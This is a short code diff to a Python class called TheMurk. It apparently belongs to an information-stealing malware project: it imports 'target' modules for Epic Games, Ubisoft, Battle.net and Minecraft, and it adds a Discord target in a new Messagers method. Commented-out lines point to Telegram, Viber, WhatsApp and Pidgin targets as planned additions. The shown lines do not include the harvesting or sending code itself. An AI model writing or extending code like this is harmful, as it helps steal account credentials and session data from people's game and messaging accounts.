@@ -10,6 +10,7 @@ from targets.games.epicgames import Epic
 from targets.games.uplay import Ubisoft
 from targets.games.battlenet import BattleNet
 from targets.games.minecraft import Minecraft
+from targets.messengers.discord import Discord
 
 class TheMurk:
     def __init__(self) -> None:
@@ -54,3 +55,10 @@ class TheMurk:
         self.msgOther = Ubisoft(self.msgOther)
         self.msgOther = Minecraft(self.msgOther)
         self.msgOther = BattleNet(self.msgOther)
+    
+    def Messagers(self):
+        self.msgOther = Discord(self.msgOther)
+        #self.msgOther = telegram.Telegram(self.msgOther)
+        #self.msgOther = viber.Viber(self.msgOther)
+        #self.msgOther = whatsapp.WhatsApp(self.msgOther)
+        #self.msgOther = pidgin.Pidgin(self.msgOther)
